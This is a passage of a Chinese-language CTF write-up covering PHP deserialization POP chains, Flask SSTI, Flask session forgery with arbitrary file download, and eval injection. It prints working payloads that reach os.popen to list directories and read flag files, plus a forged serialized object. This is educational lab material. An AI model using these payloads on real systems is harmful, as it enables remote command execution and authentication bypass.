class="hljs-variable">$charset</span> = <span class="hljs-string">&quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span>;<br>    <span class="hljs-variable">$shift</span> = <span class="hljs-number">4</span>;<br>    <span class="hljs-variable">$shifted</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$char</span> = <span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$charset</span>, <span class="hljs-variable">$char</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pos</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$new_pos</span> = <span class="hljs-variable">$pos</span> + <span class="hljs-variable">$shift</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$charset</span>);<br><br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$charset</span>[<span class="hljs-variable">$new_pos</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$shifted</span> .= <span class="hljs-variable">$char</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$shifted</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">uncipher</span>(<span class="hljs-string">&quot;p8vfuv8g8v8py&quot;</span>);<br></code></pre></td></tr></table></figure><p>得到 get&#x3D; <code>fe1ka1ele1efp</code></p><p>然后我们根据<code>cycycycy-&gt;aaa()</code>可以反推出一条pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">w_wuw_w-&gt;<span class="hljs-title function_ invoke__">destruct</span>()  =&gt;  gBoBg-&gt;<span class="hljs-title function_ invoke__">toString</span>()  =&gt;  w_wuw_w-&gt;<span class="hljs-title function_ invoke__">__invoke</span>()<br>=&gt;  EeE-&gt;<span class="hljs-title function_ invoke__">__clone</span>()  =&gt;  cycycycy-&gt;<span class="hljs-title function_ invoke__">aaa</span>()<br></code></pre></td></tr></table></figure><p>于是我们如下构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gBoBg</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$coos</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w_wuw_w</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$aaa</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>&#125;<br><span class="hljs-variable">$w</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w_wuw_w</span>();<br><span class="hljs-variable">$g</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">gBoBg</span>();<br><span class="hljs-variable">$w</span>-&gt;aaa = <span class="hljs-variable">$g</span>;<br><span class="hljs-variable">$g</span>-&gt;file = <span class="hljs-string">&quot;abc&quot;</span>;<br><span class="hljs-variable">$g</span>-&gt;coos = <span class="hljs-variable">$w</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>);<br><br>输出：<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;w_wuw_w&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;aaa&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;gBoBg&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;coos&quot;</span>;r:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>然后我们传参进行代码执行即可：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304081711847.png" alt="image-20230408171121787"></p><h4 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h4><p>打开后查看源码，提示<code>app.zip</code>，于是我们下载下来，得到源码：</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>观察一下，<code>render_template_string(&#39;hello %s&#39; % name)</code> 中模板内容可以由参数传入，所以构成了<code>python flask SSTI模板注入</code></p><p>我们观察一下，发现想要注入，</p><p>参数必需包含：<code>ge</code>，如果不包含就不能有<code>f</code></p><p>所以我们就可以去构造我们的payload</p><h5 id="本人解法"><a href="#本人解法" class="headerlink" title="本人解法"></a>本人解法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__[<span class="hljs-string">&#x27;catch_warnings&#x27;</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cd ..;cat flag&quot;).read()&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>首先我们先通过 <code>&#39;&#39;.__class__</code>获取到：字符串的类型</p><p>然后 <code>__base__</code>获取到字符串的基类(Object，python中对象基类都是Object)</p><p><code>__subclasses__()</code>函数获取到Object类的所有子类，返回一个列表</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304032349225.png" alt="image-20230403234955145" style="zoom: 33%;" /><blockquote><p><code>catch_warnings</code>是warnings下的一个模块，当有报错提示时说明导入了此类</p></blockquote><p>由于题目需要我们包含<code>ge</code>，所以我们可以使用 <code>__getitem__[]</code>特殊方法</p><p>获取给定键对应的值</p><p>然后我们再使用<code>__init__</code> 初始化<code>catch_warnings</code>类，</p><p>再使用<code>__globals__</code>，获取全局模块可读的属性、值</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040003579.png" alt="image-20230404000356404"></p><p>然后我们使用<code>__builtins__</code>，这个里面可以利用到 eval</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040007847.png" alt="image-20230404000751744"></p><p>然后我们使用eval，popen进行命令执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cd ..;cat flag&quot;).read()&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag</p><h5 id="官方解法："><a href="#官方解法：" class="headerlink" title="官方解法："></a>官方解法：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/hello/&#123;&#123; <span class="hljs-string">&quot;&quot;</span>.__class__.__base__ .__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](request.args.get(<span class="hljs-string">&quot;ctfshow&quot;</span>)).read()&#125;&#125;?ctfshow=cat /flag <br></code></pre></td></tr></table></figure><p>使用 <code>__subclasses__()[132]</code>获得第132位的类，即：<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>，os</p><p>然后 <code>__init__.__globals__[&#39;popen&#39;]</code> 初始化后调用<code>popen</code>，</p><p>但是此处使用 <code>request.args.get(&quot;ctfshow&quot;)</code>，意思是通过get传参传进来命令</p><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p>注册后看到如下界面，看样子就是要进行身份伪造越权</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040019918.png" alt="image-20230404001951846" style="zoom: 33%;" /><p>我们查看一下部分源码</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response<br><br>app = Flask(__name__)<br><br><br>app.secret_key = <span class="hljs-string">&#x27;S3cr3tK3y&#x27;</span>  <span class="hljs-comment"># 这里是关键点</span><br><br>users = &#123;<br><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br><span class="hljs-comment"># Check if user is loggedin</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>msg = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> password == users[username][<span class="hljs-string">&#x27;password&#x27;</span>]:<br>session[<span class="hljs-string">&#x27;loggedin&#x27;</span>] = <span class="hljs-literal">True</span><br>session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>session[<span class="hljs-string">&#x27;role&#x27;</span>] = users[username][<span class="hljs-string">&#x27;role&#x27;</span>]<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br><span class="hljs-keyword">else</span>:<br>msg = <span class="hljs-string">&#x27;Incorrect username/password!&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, msg=msg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>msg = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>msg = <span class="hljs-string">&#x27;Account already exists!&#x27;</span><br><span class="hljs-keyword">else</span>:<br>users[username] = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;<br>msg = <span class="hljs-string">&#x27;You have successfully registered!&#x27;</span><br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, msg=msg)<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/profile/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>():<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br><span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile2.html&#x27;</span>, username=session[<span class="hljs-string">&#x27;username&#x27;</span>], role=session[<span class="hljs-string">&#x27;role&#x27;</span>])<br><span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>........<br></code></pre></td></tr></table></figure><p>这里源码中的密钥很可疑，网站使用flask框架</p><p>用bp抓个包</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040022371.png" alt="image-20230404002223291" style="zoom: 33%;" /><p>这里cookie中存在一个session，因此我们断定这是<code>flask session伪造</code></p><p>我们使用工具：<code>flask_session_cookie_manager</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040027945.png" alt="image-20230404002709895"></p><p>先解码一下，然后把<code>user</code>换成<code>admin</code>再编码一下</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040028988.png" alt="image-20230404002805939"></p><p>得到了伪造后的session，然后我们再发送给服务器：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040029129.png" alt="image-20230404002936045" style="zoom: 33%;" /><p>发现一个下载按钮，下载后得到一个假的flag，</p><p>此处存在任意文件下载漏洞，我们下载的时候抓包，将filename改为app.py获取源码</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040031891.png" alt="image-20230404003125830"></p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response<br><br><br>app = Flask(__name__)<br><br><br>app.secret_key = <span class="hljs-string">&#x27;S3cr3tK3y&#x27;</span><br><br>users = &#123;<br>    <span class="hljs-string">&#x27;admin&#x27;</span>: &#123;<span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;<br>&#125;<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-comment"># Check if user is loggedin</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users <span class="hljs-keyword">and</span> password == users[username][<span class="hljs-string">&#x27;password&#x27;</span>]:<br>            session[<span class="hljs-string">&#x27;loggedin&#x27;</span>] = <span class="hljs-literal">True</span><br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>            session[<span class="hljs-string">&#x27;role&#x27;</span>] = users[username][<span class="hljs-string">&#x27;role&#x27;</span>]<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;profile&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            msg = <span class="hljs-string">&#x27;Incorrect username/password!&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login2.html&#x27;</span>, msg=msg)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    msg = <span class="hljs-string">&#x27;&#x27;</span> <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> request.form <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-keyword">in</span> request.form:<br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            msg = <span class="hljs-string">&#x27;Account already exists!&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            users[username] = &#123;<span class="hljs-string">&#x27;password&#x27;</span>: password, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;<br>            msg = <span class="hljs-string">&#x27;You have successfully registered!&#x27;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register2.html&#x27;</span>, msg=msg)<br><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/profile/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile2.html&#x27;</span>, username=session[<span class="hljs-string">&#x27;username&#x27;</span>], role=session[<span class="hljs-string">&#x27;role&#x27;</span>])<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/show/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;show2.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;loggedin&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;filename&#x27;</span> <span class="hljs-keyword">in</span> request.args:              <br>            <span class="hljs-keyword">return</span> send_file(filename, as_attachment=<span class="hljs-literal">True</span>)<br>  <br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():<br>    <span class="hljs-keyword">try</span>:<br>        s = request.args.get(<span class="hljs-string">&#x27;eval&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;hello,<span class="hljs-subst">&#123;<span class="hljs-built_in">eval</span>(s)&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">pass</span><br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span><br>    <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>   session.pop(<span class="hljs-string">&#x27;loggedin&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>   session.pop(<span class="hljs-string">&#x27;role&#x27;</span>, <span class="hljs-literal">None</span>)<br>   <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>这里存在代码漏洞，我们直接读根目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;ls /&quot;</span>).read()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304040037458.png" alt="image-20230404003724365"></p><p>然后查看flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat /flag_is_h3re&quot;</span>).read()<br></code></pre></td></tr></table></figure><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ 